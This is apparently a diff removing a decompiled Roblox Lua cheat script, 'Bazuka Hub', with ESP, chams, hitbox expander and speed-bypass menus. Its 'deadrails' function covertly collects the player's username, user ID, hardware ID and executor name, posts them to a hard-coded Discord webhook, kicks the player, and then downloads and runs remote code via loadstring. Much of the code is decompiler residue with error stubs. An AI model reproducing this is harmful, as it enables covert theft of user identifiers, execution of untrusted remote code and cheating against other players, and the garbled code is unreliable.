-    local _5077 = _5076()
-    _5075(_5062, {
-        Default = _5077,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_5079, _5079_2, _5079_3)
-    end)
-    local _5080 = _5062.Slider
-    _5080(_5062, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_5082, _5082_2, _5082_3)
-        local _5083, _5083_2, _5083_3 = math.floor(_5082)
-        local _ = _5083 / 100
-    end)
-    type(_4055)
-    local _ = _4055.r
-    local _ = _4055.g
-    local _ = _4055.b
-    local _5089 = _5062.ColorPicker
-    local _5090 = Color3.new
-    local _5091 = _5090()
-    _5089(_5062, {
-        Default = _5091,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_5093, _5093_2, _5093_3)
-    end)
-    local _5094 = _4800.Section
-    local _5095 = _5094(_4800, "Battery ESP", "Right")
-    local _5096 = _5095.Toggle
-    _5096(_5095, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_5098, _5098_2, _5098_3)
-    end)
-    local _5099 = _5095.Slider
-    _5099(_5095, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_5101, _5101_2, _5101_3)
-        local _5102, _5102_2, _5102_3 = math.floor(_5101)
-        local _ = _5102 / 100
-    end)
-    local _5104 = _5095.Toggle
-    _5104(_5095, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_5106, _5106_2, _5106_3)
-    end)
-    local _5107 = _5095.Toggle
-    _5107(_5095, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_5109, _5109_2, _5109_3)
-    end)
-    local _5110 = _5095.Toggle
-    _5110(_5095, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_5112, _5112_2, _5112_3)
-    end)
-    local _5113 = _5095.Slider
-    _5113(_5095, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_5115, _5115_2, _5115_3)
-        math.floor(_5115)
-    end)
-    type(_4087)
-    local _ = _4087.r
-    local _ = _4087.g
-    local _ = _4087.b
-    local _5121 = _5095.ColorPicker
-    local _5122 = Color3.new
-    local _5123 = _5122()
-    _5121(_5095, {
-        Default = _5123,
-        Description = "",
-        Title = "Text Color",
-    }, function(_5125, _5125_2, _5125_3)
-    end)
-    local _5126 = _4800.Section
-    local _5127 = _5126(_4800, "Gold Pile Chams", "Left")
-    local _5128 = _5127.Toggle
-    _5128(_5127, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_5130, _5130_2, _5130_3)
-    end)
-    local _5131 = _5127.Slider
-    _5131(_5127, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_5133, _5133_2, _5133_3)
-        local _5134, _5134_2, _5134_3 = math.floor(_5133)
-        local _ = _5134 / 100
-    end)
-    type(_4049)
-    local _ = _4049.r
-    local _ = _4049.g
-    local _ = _4049.b
-    local _5140 = _5127.ColorPicker
-    local _5141 = Color3.new
-    local _5142 = _5141()
-    _5140(_5127, {
-        Default = _5142,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_5144, _5144_2, _5144_3)
-    end)
-    local _5145 = _5127.Slider
-    _5145(_5127, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_5147, _5147_2, _5147_3)
-        local _5148, _5148_2, _5148_3 = math.floor(_5147)
-        local _ = _5148 / 100
-    end)
-    type(_4051)
-    local _ = _4051.r
-    local _ = _4051.g
-    local _ = _4051.b
-    local _5154 = _5127.ColorPicker
-    local _5155 = Color3.new
-    local _5156 = _5155()
-    _5154(_5127, {
-        Default = _5156,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_5158, _5158_2, _5158_3)
-    end)
-    local _5159 = _4800.Section
-    local _5160 = _5159(_4800, "Gold Pile ESP", "Right")
-    local _5161 = _5160.Toggle
-    _5161(_5160, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_5163, _5163_2, _5163_3)
-    end)
-    local _5164 = _5160.Slider
-    _5164(_5160, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_5166, _5166_2, _5166_3)
-        local _5167, _5167_2, _5167_3 = math.floor(_5166)
-        local _ = _5167 / 100
-    end)
-    local _5169 = _5160.Toggle
-    _5169(_5160, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_5171, _5171_2, _5171_3)
-    end)
-    local _5172 = _5160.Toggle
-    _5172(_5160, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_5174, _5174_2, _5174_3)
-    end)
-    local _5175 = _5160.Toggle
-    _5175(_5160, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_5177, _5177_2, _5177_3)
-    end)
-    local _5178 = _5160.Slider
-    _5178(_5160, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_5180, _5180_2, _5180_3)
-        math.floor(_5180)
-    end)
-    type(_4085)
-    local _ = _4085.r
-    local _ = _4085.g
-    local _ = _4085.b
-    local _5186 = _5160.ColorPicker
-    local _5187 = Color3.new
-    local _5188 = _5187()
-    _5186(_5160, {
-        Default = _5188,
-        Description = "",
-        Title = "Text Color",
-    }, function(_5190, _5190_2, _5190_3)
-    end)
-    local _5191 = _4800.Section
-    local _5192 = _5191(_4800, "Bandage Chams", "Left")
-    local _5193 = _5192.Toggle
-    _5193(_5192, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_5195, _5195_2, _5195_3)
-    end)
-    local _5196 = _5192.Slider
-    _5196(_5192, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_5198, _5198_2, _5198_3)
-        local _5199, _5199_2, _5199_3 = math.floor(_5198)
-        local _ = _5199 / 100
-    end)
-    type(_4045)
-    local _ = _4045.r
-    local _ = _4045.g
-    local _ = _4045.b
-    local _5205 = _5192.ColorPicker
-    local _5206 = Color3.new
-    local _5207 = _5206()
-    _5205(_5192, {
-        Default = _5207,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_5209, _5209_2, _5209_3)
-    end)
-    local _5210 = _5192.Slider
-    _5210(_5192, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_5212, _5212_2, _5212_3)
-        local _5213, _5213_2, _5213_3 = math.floor(_5212)
-        local _ = _5213 / 100
-    end)
-    type(_4047)
-    local _ = _4047.r
-    local _ = _4047.g
-    local _ = _4047.b
-    local _5219 = _5192.ColorPicker
-    local _5220 = Color3.new
-    local _5221 = _5220()
-    _5219(_5192, {
-        Default = _5221,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_5223, _5223_2, _5223_3)
-    end)
-    local _5224 = _4800.Section
-    local _5225 = _5224(_4800, "Bandage ESP", "Right")
-    local _5226 = _5225.Toggle
-    _5226(_5225, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_5228, _5228_2, _5228_3)
-    end)
-    local _5229 = _5225.Slider
-    _5229(_5225, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_5231, _5231_2, _5231_3)
-        local _5232, _5232_2, _5232_3 = math.floor(_5231)
-        local _ = _5232 / 100
-    end)
-    local _5234 = _5225.Toggle
-    _5234(_5225, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_5236, _5236_2, _5236_3)
-    end)
-    local _5237 = _5225.Toggle
-    _5237(_5225, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_5239, _5239_2, _5239_3)
-    end)
-    local _5240 = _5225.Toggle
-    _5240(_5225, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_5242, _5242_2, _5242_3)
-    end)
-    local _5243 = _5225.Slider
-    _5243(_5225, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_5245, _5245_2, _5245_3)
-        math.floor(_5245)
-    end)
-    type(_4083)
-    local _ = _4083.r
-    local _ = _4083.g
-    local _ = _4083.b
-    local _5251 = _5225.ColorPicker
-    local _5252 = Color3.new
-    local _5253 = _5252()
-    _5251(_5225, {
-        Default = _5253,
-        Description = "",
-        Title = "Text Color",
-    }, function(_5255, _5255_2, _5255_3)
-    end)
-    local _5256 = _3978.Button
-    local _5257 = _5256(_3978, "Character Modifiying", "http://www.roblox.com/asset/?id=8395621517")
-    local _5258 = _5257.Section
-    local _5259 = _5258(_5257, "Character Actions", "Left")
-    local _5260 = _5259.Button
-    _5260(_5259, {
-        ButtonName = "Stun",
-        Title = "Stun",
-        Description = "",
-    }, function(_5262, _5262_2, _5262_3)
-        local _5263 = game.Players.LocalPlayer
-        local _5264 = _5263.Character
-        local _5265 = _5264.SetAttribute
-        _5265(_5264, "Stunned", true)
-    end)
-    local _5267 = _5259.Button
-    _5267(_5259, {
-        ButtonName = "UnStun",
-        Title = "UnStun",
-        Description = "",
-    }, function(_5269, _5269_2, _5269_3)
-        local _5270 = game.Players.LocalPlayer
-        local _5271 = _5270.Character
-        local _5272 = _5271.SetAttribute
-        _5272(_5271, "Stunned", false)
-    end)
-    local _5274 = _5259.Button
-    _5274(_5259, {
-        ButtonName = "Die",
-        Title = "Death",
-        Description = "",
-    }, function(_5276, _5276_2, _5276_3)
-        local _5277 = game.Players.LocalPlayer
-        local _5278 = _5277.Character
-        local _ = _5278.Humanoid
-        error("line 1: attempt to perform arithmetic (unm) on function")
-    end)
-    local _5280 = _5259.Button
-    _5280(_5259, {
-        ButtonName = "ReJoin",
-        Title = "ReJoining",
-        Description = "",
-    }, function(_5282, _5282_2, _5282_3)
-        local _TeleportService5283 = game:GetService("TeleportService")
-        local _5284 = _TeleportService5283.Teleport
-        local _Players5285 = game:GetService("Players")
-        local _5286 = _Players5285.LocalPlayer
-        _5284(_TeleportService5283, game.PlaceId, _5286)
-    end)
-    local _5288 = _5257.Section
-    local _5289 = _5288(_5257, "Character Modifications", "Right")
-    local _5290 = _5289.Toggle
-    _5290(_5289, {
-        Default = false,
-        Description = "Unstoppable Jump",
-        Title = "Eternal Jump",
-    }, function(_5292, _5292_2, _5292_3)
-    end)
-    local _5293 = _5289.Toggle
-    _5293(_5289, {
-        Default = false,
-        Description = "Block Delay Optimization",
-        Title = "Speed Bypass",
-    }, function(_5295, _5295_2, _5295_3)
-    end)
-    local _5296 = _5289.Toggle
-    _5296(_5289, {
-        Default = false,
-        Description = "",
-        Title = "Speed Multiplier",
-    }, function(_5298, _5298_2, _5298_3)
-    end)
-    local _5299 = _5289.Slider
-    _5299(_5289, {
-        Min = 0,
-        Title = "Custom Speed",
-        Max = 1000,
-        Default = 0,
-        Description = "",
-    }, function(_5301, _5301_2, _5301_3)
-        local _5302 = _5301 / 10
-        math.floor(_5302)
-    end)
-    local _5304 = _5289.Toggle
-    _5304(_5289, {
-        Default = false,
-        Description = "",
-        Title = "Oxygen Changer",
-    }, function(_5306, _5306_2, _5306_3)
-    end)
-    local _5307 = _5289.Slider
-    _5307(_5289, {
-        Min = 0,
-        Title = "Custom Oxygen",
-        Max = 100,
-        Default = 100,
-        Description = "",
-    }, function(_5309, _5309_2, _5309_3)
-        math.floor(_5309)
-    end)
-    local _5311 = Instance.new
-    local _5312 = _5311("ScreenGui", game.CoreGui)
-    local _5313 = Instance.new
-    local _5314 = _5313("TextButton")
-    _5314.BackgroundTransparency = 1
-    local _5315 = UDim2.new
-    local _5316 = _5315(0, 0, 0, 0)
-    _5314.Size = _5316
-    _5314.Text = " "
-    _5314.Parent = _5312
-    local _5317 = Instance.new
-    local _5318 = _5317("ScreenGui", game.CoreGui)
-    _5318.Name = "BackgroundScreenGui"
-    _5318.Enabled = true
-    local _5319 = Instance.new
-    local _5320 = _5319("TextLabel", _5318)
-    _5320.Name = "BackgroundLabel"
-    local _5321 = Instance.new
-    local _5322 = _5321("UIGradient", _5320)
-    _5322.Name = "BackgroundGradient"
-    local _ = ColorSequence.new
-    error("line 1: attempt to index nil with 'new'")
-end
-fenv.menuOpen = true
-fenv.backgroundgradientenabled = true
-fenv.backgroundgradienttransparency = 0.5
-fenv.backgroundgradientrotation = 0
-fenv.backgroundgradientcolor1 = _5369
-fenv.backgroundgradientcolor2 = _5371
-fenv.screengirlenabled = true
-fenv.screengirlside = true
-fenv.screengirl = "Tomoko"
-fenv.blurenabled = true
-fenv.blursize = 24
-fenv.autosaveconfig = false
-fenv.customguicolor = _5373
-fenv.customshadowcolor = _5375
-fenv.customguidpi = 80
-fenv.customshadowtransparency = 0.5
-fenv.textsize = 0
-fenv.expanderstatus = false
-fenv.headsizea = 1
-fenv.bringtarget = "All"
-fenv.originaltime = _5376
-fenv.customtime = "12:00:00"
-fenv.hours = 12
-fenv.minutes = 0
-fenv.changetimestatus = false
-fenv.fullbrightstatus = false
-fenv.levelofbrightness = 6
-fenv.originalfogcolor = _5377
-fenv.customfogcolor = _5379
-fenv.originalfogend = _5380
-fenv.customfogend = 1000
-fenv.originalfogstart = _5381
-fenv.customfogstart = 100
-fenv.changefogstatus = false
-fenv.chamsitemstatus = false
-fenv.chamsitemoutlinecolora = _5383
-fenv.chamsitemfillingcolora = _5385
-fenv.chamsitemoutlinetransparencya = 0
-fenv.chamsitemfillingtransparencya = 0.9
-fenv.chamsmobstatus = false
-fenv.chamsmoboutlinecolora = _5387
-fenv.chamsmobfillingcolora = _5389
-fenv.chamsmoboutlinetransparencya = 0
-fenv.chamsmobfillingtransparencya = 0.9
-fenv.mobespstatus = false
-fenv.namemobespstatus = false
-fenv.healthmobespstatus = false
-fenv.distancemobespstatus = false
-fenv.enabledmoboutline = true
-fenv.textsizenamemoba = 8
-fenv.namemobespcolora = _5391
-fenv.mobespoffseta = 0.5
-fenv.fontnamemobesp = "Montserrat"
-fenv.itemespstatus = false
-fenv.nameitemespstatus = false
-fenv.distanceitemespstatus = false
-fenv.enableditemoutline = true
-fenv.textsizenameitema = 8
-fenv.nameitemespcolora = _5393
-fenv.itemespoffseta = 0.5
-fenv.fontnameitemesp = "Montserrat"
-fenv.UpdateInfo = "All Games:\n    Info:\n        [+] - Added Time, FPS, Ping\n        [+] - Added Last Update Changelog\n    All Categories:\n        [~] - Improved Canvas Size in Dropdown\n"
-fenv.bringtarget = _5427
-fenv.expanderstatus = _5435
-fenv.headsizea = nil
-fenv.changetimestatus = _5447
-fenv.hours = _5451
-fenv.minutes = _5455
-fenv.fullbrightstatus = _5460
-fenv.levelofbrightness = _5464
-fenv.changefogstatus = _5469
-fenv.customfogend = _5473
-fenv.customfogstart = _5477
-fenv.b = _5481
-fenv.g = _5480
-fenv.r = _5479
-fenv.customfogcolor = _5486
-fenv.chamsmobstatus = _5502
-fenv.chamsmoboutlinetransparencya = _5507
-fenv.b = _5511
-fenv.g = _5510
-fenv.r = _5509
-fenv.chamsmoboutlinecolora = _5516
-fenv.chamsmobfillingtransparencya = _5521
-fenv.b = _5525
-fenv.g = _5524
-fenv.r = _5523
-fenv.chamsmobfillingcolora = _5530
-fenv.mobespstatus = _5535
-fenv.mobespoffseta = _5540
-fenv.enabledmoboutline = _5543
-fenv.namemobespstatus = _5546
-fenv.healthmobespstatus = _5549
-fenv.distancemobespstatus = _5552
-fenv.textsizenamemoba = _5556
-fenv.b = _5560
-fenv.g = _5559
-fenv.r = _5558
-fenv.namemobespcolora = _5565
-fenv.chamsitemstatus = _5572
-fenv.chamsitemoutlinetransparencya = _5577
-fenv.b = _5581
-fenv.g = _5580
-fenv.r = _5579
-fenv.chamsitemoutlinecolora = _5586
-fenv.chamsitemfillingtransparencya = _5591
-fenv.b = _5595
-fenv.g = _5594
-fenv.r = _5593
-fenv.chamsitemfillingcolora = _5600
-fenv.itemespstatus = _5605
-fenv.itemespoffseta = _5610
-fenv.enableditemoutline = _5613
-fenv.nameitemespstatus = _5616
-local _ = fenv.healthitemespstatus
-fenv.healthitemespstatus = _5620
-fenv.distanceitemespstatus = _5623
-fenv.textsizenameitema = _5627
-fenv.b = _5631
-fenv.g = _5630
-fenv.r = _5629
-fenv.nameitemespcolora = _5636
-fenv.mouse = _5666
-fenv.tool = _5668
-fenv.deadrails = function(_5324, _5324_2, _5324_3)
-    local _5325 = game.Players.LocalPlayer
-    local _5326 = _5325.UserId
-    local _5327 = game.Players.LocalPlayer
-    local _5328 = _5327.DisplayName
-    local _5329 = game.Players.LocalPlayer
-    local _5330 = _5329.Name
-    local _RbxAnalyticsService5331 = game:GetService("RbxAnalyticsService")
-    local _5332 = _RbxAnalyticsService5331.GetClientId
-    local _5333 = _5332(_RbxAnalyticsService5331)
-    local _MarketplaceService5334 = game:GetService("MarketplaceService")
-    local _5335 = _MarketplaceService5334.GetProductInfo
-    local _5336 = _5335(_MarketplaceService5334, game.PlaceId)
-    local _5337 = _5336.Name
-    local _5338, _5338_2 = identifyexecutor()
-    local _5339, _5339_2, _5339_3 = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %s\n**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s \n", _5326, _5328, _5330, _5326, _5333, "03/21/2025", "14:26:59", game.PlaceId, _5337, game.PlaceId, _5338)
-    local _5340 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _5326
-    local _5341 = _5340 .. "&width=150&height=150&format=png"
-    local _HttpService5342 = game:GetService("HttpService")
-    local _5343 = _HttpService5342.JSONEncode
-    local _5344 = _5343(_HttpService5342, {
-        content = "@everyone @here",
-        embeds = {
-            [1] = {
-                type = "rich",
-                description = _5339,
-                color = 16766720,
-                author = {
-                    name = "Someone Try to Crack Bazuka Hub!",
-                    url = "https://roblox.com",
-                },
-                thumbnail = {
-                    url = _5341,
-                },
-            },
-        },
-    })
-    local _5345 = _5344.gsub
-    local _5346 = _5345(_5344, "\"color\":%d+", "\"color\":13828096")
-    http_request({
-        Headers = {
-            ["content-type"] = "application/json",
-        },
-        Url = "https://discord.com/api/webhooks/1352655828632469566/xBrzgbnDhuE9uybK42tGU8UeFh0GMu_i0hXMnAKw7oQhqhnAOc-XcqjKe5VVvBM2Ghzj",
-        Method = "POST",
-        Body = _5346,
-    })
-    local _5348 = game.Players.LocalPlayer
-    local _5349 = _5348.Kick
-    _5349(_5348, "GOT YOU XD!")
-    local _5351 = game:HttpGet("https://raw.githubusercontent.com/Reyn7525/GUI_LIB/refs/heads/main/HydraHub")
-    local _5352 = loadstring(_5351)
-    local _5353 = _5352()
-    local _5354 = _5353.new
-    local _5355 = game.Players.LocalPlayer
-    local _5356 = _5355.DisplayName
-    local _5357 = _5354("Bazuka Hub", _5356, "Bazuka Hub")
-    local _5358 = _5357.Category
-    local _5359 = _5358(_5357, "Info", "http://www.roblox.com/asset/?id=12707252279")
-    local _5360 = _5357.Category
-    local _5361 = _5360(_5357, "Misc", "http://www.roblox.com/asset/?id=97163436981193")
-    local _5362 = _5357.Category
-    local _5363 = _5362(_5357, "Visual", "http://www.roblox.com/asset/?id=13321848320")
-    local _5364 = _5357.Category
-    local _5365 = _5364(_5357, "Character", "http://www.roblox.com/asset/?id=8395621517")
-    local _5366 = _5357.Category
-    _5366(_5357, "Other", "http://www.roblox.com/asset/?id=11932591062")
-    local _5368 = Color3.fromRGB
-    _5368(255, 255, 255)
-    local _5370 = Color3.fromRGB
-    _5370(0, 0, 0)
-    local _5372 = Color3.fromRGB
-    _5372(160, 160, 160)
-    local _5374 = Color3.fromRGB
-    _5374(0, 0, 0)
-    local _ = game.Lighting.TimeOfDay
-    local _ = game.Lighting.FogColor
-    local _5378 = Color3.fromRGB
-    local _5379 = _5378(255, 255, 255)
-    local _ = game.Lighting.FogEnd
-    local _ = game.Lighting.FogStart
-    local _5382 = Color3.fromRGB
-    local _5383 = _5382(255, 255, 255)
-    local _5384 = Color3.fromRGB
-    local _5385 = _5384(255, 255, 255)
-    local _5386 = Color3.fromRGB
-    local _5387 = _5386(255, 255, 255)
-    local _5388 = Color3.fromRGB
-    local _5389 = _5388(255, 255, 255)
-    local _5390 = Color3.fromRGB
-    local _5391 = _5390(255, 255, 255)
-    local _5392 = Color3.fromRGB
-    local _5393 = _5392(255, 255, 255)
-    task.spawn(function(_5395, _5395_2, _5395_3)
-        writefile(".tests/readfile.txt", "success")
-    end)
-    task.spawn(function(_5398, _5398_2, _5398_3)
-    end)
-    task.spawn(function(_5400, _5400_2, _5400_3)
-        writefile(".tests/writefile.txt", "success")
-    end)
-    task.spawn(function(_5403, _5403_2, _5403_3)
-        writefile(".tests/appendfile.txt", "su")
-    end)
-    local _5404 = _5357.Notification
-    _5404(_5357, {
-        expire = 3,
-        Title = "Bazuka Hub",
-        Desc = "Your executor doesnt support config system!",
-    })
-    local _5406 = _5359.Button
-    local _5407 = _5406(_5359, "Information", "http://www.roblox.com/asset/?id=12707252279")
-    local _5408 = _5407.Section
-    local _5409 = _5408(_5407, "GUI was made by Bazuka_ofcx", "Left")
-    local _5410 = _5409.Button
-    _5410(_5409, {
-        ButtonName = "Copy Link",
-        Title = "GUI Library",
-        Description = "Modified Bazuka Hub",
-    }, function(_5412, _5412_2, _5412_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _5413 = _5409.Button
-    _5413(_5409, {
-        ButtonName = "Copy Link",
-        Title = "Discord link",
-        Description = "Our Discord Server",
-    }, function(_5415, _5415_2, _5415_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _5416 = _5407.Section
-    _5416(_5407, "Information:", "Left")
-    local _5418 = _5407.Section
-    _5418(_5407, "Last Update Changelog:", "Right")
-    local _5420 = _5361.Button
-    local _5421 = _5420(_5361, "Misc Features", "http://www.roblox.com/asset/?id=97163436981193")
-    local _5422 = _5421.Section
-    local _5423 = _5422(_5421, "Bring", "Left")
-    local _5424 = _5423.Dropdown
-    _5424(_5423, {
-        Title = "Target",
-        Default = "All",
-        Multi = false,
-        Options = {
-            ["No Corpses"] = false,
-            All = false,
-            ["Only Corpses"] = false,
-        },
-        Description = "Choose one of them",
-    }, function(_5426, _5426_2, _5426_3)
-        for _5427, _5427_2 in _5426 do
-        end
-    end)
-    local _5428 = _5423.Button
-    _5428(_5423, {
-        ButtonName = "Bring",
-        Title = "All Items",
-        Description = "Teleport All Items to You",
-    }, function(_5430, _5430_2, _5430_3)
-    end)
-    local _5431 = _5421.Section
-    local _5432 = _5431(_5421, "Hitbox Expander", "Left")
-    local _5433 = _5432.Toggle
-    _5433(_5432, {
-        Default = false,
-        Description = "Automatically Apply New Size",
-        Title = "Enable",
-    }, function(_5435, _5435_2, _5435_3)
-    end)
-    local _5436 = _5432.Slider
-    _5436(_5432, {
-        Min = 1,
-        Title = "Head Size",
-        Max = 420,
-        Default = 100,
-        Description = "",
-    }, function(_5438, _5438_2, _5438_3)
-        local _5439, _5439_2, _5439_3 = math.floor(_5438)
-        local _ = _5439 / 100
-    end)
-    local _5441 = _5363.Button
-    local _5442 = _5441(_5363, "World Improve", "http://www.roblox.com/asset/?id=11887653877")
-    local _5443 = _5442.Section
-    local _5444 = _5443(_5442, "Ð¡ustom Time", "Left")
-    local _5445 = _5444.Toggle
-    _5445(_5444, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_5447, _5447_2, _5447_3)
-    end)
-    local _5448 = _5444.Slider
-    _5448(_5444, {
-        Min = 0,
-        Title = "Hours",
-        Max = 23,
-        Default = 12,
-        Description = "",
-    }, function(_5450, _5450_2, _5450_3)
-        math.floor(_5450)
-    end)
-    local _5452 = _5444.Slider
-    _5452(_5444, {
-        Min = 0,
-        Title = "Minutes",
-        Max = 59,
-        Default = 0,
-        Description = "",
-    }, function(_5454, _5454_2, _5454_3)
-        math.floor(_5454)
-    end)
-    local _5456 = _5442.Section
-    local _5457 = _5456(_5442, "Vision Upgrade", "Left")
-    local _5458 = _5457.Toggle
-    _5458(_5457, {
-        Default = false,
-        Description = "",
-        Title = "FullBright",
-    }, function(_5460, _5460_2, _5460_3)
-    end)
-    local _5461 = _5457.Slider
-    _5461(_5457, {
-        Min = 0,
-        Title = "Brightness",
-        Max = 10,
-        Default = 6,
-        Description = "",
-    }, function(_5463, _5463_2, _5463_3)
-        math.floor(_5463)
-    end)
-    local _5465 = _5442.Section
-    local _5466 = _5465(_5442, "Custom Fog", "Right")
-    local _5467 = _5466.Toggle
-    _5467(_5466, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_5469, _5469_2, _5469_3)
-    end)
-    local _5470 = _5466.Slider
-    _5470(_5466, {
-        Min = 0,
-        Title = "Fog End",
-        Max = 5000,
-        Default = 1000,
-        Description = "",
-    }, function(_5472, _5472_2, _5472_3)
-        math.floor(_5472)
-    end)
-    local _5474 = _5466.Slider
-    _5474(_5466, {
-        Min = 0,
-        Title = "Fog Start",
-        Max = 2000,
-        Default = 100,
-        Description = "",
-    }, function(_5476, _5476_2, _5476_3)
-        math.floor(_5476)
-    end)
-    type(_5379)
-    local _ = _5379.r
-    local _ = _5379.g
-    local _ = _5379.b
-    local _5482 = _5466.ColorPicker
-    local _5483 = Color3.new
-    local _5484 = _5483()
-    _5482(_5466, {
-        Default = _5484,
-        Description = "",
-        Title = "Fog Color",
-    }, function(_5486, _5486_2, _5486_3)
-    end)
-    local _5487 = _5442.Section
-    local _5488 = _5487(_5442, "Custom Fov", "Right")
-    local _5489 = _5488.Slider
-    local _5490 = game.Workspace.Camera
-    local _5491 = _5490.FieldOfView
-    _5489(_5488, {
-        Min = 0,
-        Title = "Fov",
-        Max = 120,
-        Default = _5491,
-        Description = "Default = 70",
-    }, function(_5493, _5493_2, _5493_3)
-        local _5494 = game.Workspace.Camera
-        local _5495, _5495_2, _5495_3 = math.floor(_5493)
-        _5494.FieldOfView = _5495
-    end)
-    local _5496 = _5363.Button
-    local _5497 = _5496(_5363, "Mob Chams & ESP", "http://www.roblox.com/asset/?id=12120698352")
-    local _5498 = _5497.Section
-    local _5499 = _5498(_5497, "Chams", "Left")
-    local _5500 = _5499.Toggle
-    _5500(_5499, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_5502, _5502_2, _5502_3)
-    end)
-    local _5503 = _5499.Slider
-    _5503(_5499, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_5505, _5505_2, _5505_3)
-        local _5506, _5506_2, _5506_3 = math.floor(_5505)
-        local _ = _5506 / 100
-    end)
-    type(_5387)
-    local _ = _5387.r
-    local _ = _5387.g
-    local _ = _5387.b
-    local _5512 = _5499.ColorPicker
-    local _5513 = Color3.new
-    local _5514 = _5513()
-    _5512(_5499, {
-        Default = _5514,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_5516, _5516_2, _5516_3)
-    end)
-    local _5517 = _5499.Slider
-    _5517(_5499, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_5519, _5519_2, _5519_3)
-        local _5520, _5520_2, _5520_3 = math.floor(_5519)
-        local _ = _5520 / 100
-    end)
-    type(_5389)
-    local _ = _5389.r
-    local _ = _5389.g
-    local _ = _5389.b
-    local _5526 = _5499.ColorPicker
-    local _5527 = Color3.new
-    local _5528 = _5527()
-    _5526(_5499, {
-        Default = _5528,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_5530, _5530_2, _5530_3)
-    end)
-    local _5531 = _5497.Section
-    local _5532 = _5531(_5497, "ESP", "Right")
-    local _5533 = _5532.Toggle
-    _5533(_5532, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_5535, _5535_2, _5535_3)
-    end)
-    local _5536 = _5532.Slider
-    _5536(_5532, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_5538, _5538_2, _5538_3)
-        local _5539, _5539_2, _5539_3 = math.floor(_5538)
-        local _ = _5539 / 100
-    end)
-    local _5541 = _5532.Toggle
-    _5541(_5532, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_5543, _5543_2, _5543_3)
-    end)
-    local _5544 = _5532.Toggle
-    _5544(_5532, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_5546, _5546_2, _5546_3)
-    end)
-    local _5547 = _5532.Toggle
-    _5547(_5532, {
-        Default = false,
-        Description = "",
-        Title = "Health ESP",
-    }, function(_5549, _5549_2, _5549_3)
-    end)
-    local _5550 = _5532.Toggle
-    _5550(_5532, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_5552, _5552_2, _5552_3)
-    end)
-    local _5553 = _5532.Slider
-    _5553(_5532, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_5555, _5555_2, _5555_3)
-        math.floor(_5555)
-    end)
-    type(_5391)
-    local _ = _5391.r
-    local _ = _5391.g
-    local _ = _5391.b
-    local _5561 = _5532.ColorPicker
-    local _5562 = Color3.new
-    local _5563 = _5562()
-    _5561(_5532, {
-        Default = _5563,
-        Description = "",
-        Title = "Text Color",
-    }, function(_5565, _5565_2, _5565_3)
-    end)
-    local _5566 = _5363.Button
-    local _5567 = _5566(_5363, "Item Chams & ESP", "http://www.roblox.com/asset/?id=12120698352")
-    local _5568 = _5567.Section
-    local _5569 = _5568(_5567, "Chams", "Left")
